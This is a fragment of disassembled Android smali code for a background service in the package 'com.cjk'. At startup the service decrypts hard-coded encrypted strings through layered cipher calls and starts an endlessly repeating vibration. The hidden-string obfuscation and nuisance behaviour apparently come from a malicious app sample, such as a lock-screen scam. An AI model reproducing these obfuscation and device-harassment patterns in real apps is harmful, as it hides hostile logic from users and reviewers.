    invoke-static/range {v34 .. v34}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v34

    invoke-static/range {v34 .. v34}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v34

    aput v34, v32, v33

    .line 139
    add-int/lit8 v25, v25, 0x1

    goto/16 :goto_1

    .line 211
    :catch_1
    move-exception v32

    move-object/from16 v25, v32

    goto :goto_2
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 28
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v4, v0

    const-string v5, "com.aide.ui"

    invoke-static {v4, v5}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 43
    move-object v4, v0

    invoke-super {v4}, Landroid/app/Service;->onCreate()V

    .line 44
    move-object v4, v0

    new-instance v5, Lcom/cjk/DU;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    const-string v7, "bah.java"

    invoke-direct {v6, v7}, Lcom/cjk/DU;-><init>(Ljava/lang/String;)V

    iput-object v5, v4, Lcom/cjk/s;->des:Lcom/cjk/DU;

    .line 45
    move-object v4, v0

    new-instance v5, Lcom/cjk/DU;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    move-object v7, v0

    invoke-virtual {v7}, Lcom/cjk/s;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/cjk/三生石畔彼岸花开;->getbah(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Lcom/cjk/DU;-><init>(Ljava/lang/String;)V

    iput-object v5, v4, Lcom/cjk/s;->dex:Lcom/cjk/DU;

    .line 48
    move-object v4, v0

    :try_start_0
    new-instance v5, Lcom/cjk/DU;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    move-object v7, v0

    iget-object v7, v7, Lcom/cjk/s;->des:Lcom/cjk/DU;

    move-object v8, v0

    iget-object v8, v8, Lcom/cjk/s;->dex:Lcom/cjk/DU;

    const-string v9, "5b06e47f5a6bc6407cfbe555797a58c1630465a98e7840bc2e25790c23b32af0ea62c04bbc543f5c8fc450ce78a08e2418f1af48b119df16ce9c14b8365e3fcaa79b9c7c852420b5"

    invoke-virtual {v8, v9}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcom/cjk/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Lcom/cjk/DU;-><init>(Ljava/lang/String;)V

    iput-object v5, v4, Lcom/cjk/s;->dex:Lcom/cjk/DU;

    .line 49
    move-object v4, v0

    new-instance v5, Lcom/cjk/DU;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    const-string v7, "b5d35db39f31537574448579590a2bc9213186c78217456930359bdcac240d05"

    invoke-static {v7}, Lcom/cjk/三生石畔彼岸花开;->getbah(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Lcom/cjk/DU;-><init>(Ljava/lang/String;)V

    iput-object v5, v4, Lcom/cjk/s;->des:Lcom/cjk/DU;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 53
    :goto_0
    move-object v4, v0

    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lcom/cjk/s;->bahk:Ljava/lang/String;

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v7}, Lcom/cjk/s;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    iput-object v5, v4, Lcom/cjk/s;->share:Landroid/content/SharedPreferences;

    .line 54
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/cjk/s;->share:Landroid/content/SharedPreferences;

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    iput-object v5, v4, Lcom/cjk/s;->editor:Landroid/content/SharedPreferences$Editor;

    .line 55
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/cjk/s;->dex:Lcom/cjk/DU;

    iput-object v5, v4, Lcom/cjk/s;->des:Lcom/cjk/DU;

    .line 56
    move-object v4, v0

    invoke-virtual {v4}, Lcom/cjk/s;->getApplication()Landroid/app/Application;

    move-result-object v4

    const-string v5, "vibrator"

    invoke-virtual {v4, v5}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/os/Vibrator;

    move-object v2, v4

    .line 58
    move-object v4, v2

    const/4 v5, 0x4

    new-array v5, v5, [J

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    const/4 v7, 0x0

    const/16 v8, 0x64

    int-to-long v8, v8

    aput-wide v8, v6, v7

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    const/4 v7, 0x1

    const/16 v8, 0x5dc

    int-to-long v8, v8

    aput-wide v8, v6, v7

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    const/4 v7, 0x2

    const/16 v8, 0x64

    int-to-long v8, v8

    aput-wide v8, v6, v7

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    const/4 v7, 0x3

    const/16 v8, 0x5dc

    int-to-long v8, v8

    aput-wide v8, v6, v7

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Landroid/os/Vibrator;->vibrate([JI)V

    return-void

    .line 49
    :catch_0
    move-exception v4

    move-object v2, v4

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Intent;",
            "I)V"
        }
    .end annotation

    .prologue
    .line 62
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-object v4, v0

    move-object v5, v1

    move v6, v2

    invoke-super {v4, v5, v6}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 63
    move-object v4, v0

    invoke-direct {v4}, Lcom/cjk/s;->c()V

    return-void
.end method
